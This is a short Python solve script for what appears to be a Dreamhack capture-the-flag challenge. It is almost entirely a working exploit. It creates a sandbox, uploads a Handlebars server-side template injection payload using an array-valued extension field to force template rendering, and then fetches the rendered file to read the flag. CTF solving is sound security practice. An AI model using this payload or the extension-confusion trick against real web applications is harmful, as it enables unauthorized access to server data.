import requests

url = "http://host3.dreamhack.games:15159"
s = requests.Session()

# create sandbox
res = s.get(url)

sandbox = res.url.split('/')[-1]
print("Sandbox:", sandbox)

# ssti
filename = ['', '', '.ejs', '.hbs']

payload = '{{#each this}}{{#if this.substring}}{{this}}{{/if}}{{/each}}'

res = s.post(f"{url}/{sandbox}", json={
    'filename': './',
    'ext': filename,
    'contents': payload
})

if res.json()['result']:
    print("> Payload uploaded")

res = s.get(f'{url}/{sandbox}/{','.join(filename)}')
print("Flag:", res.text)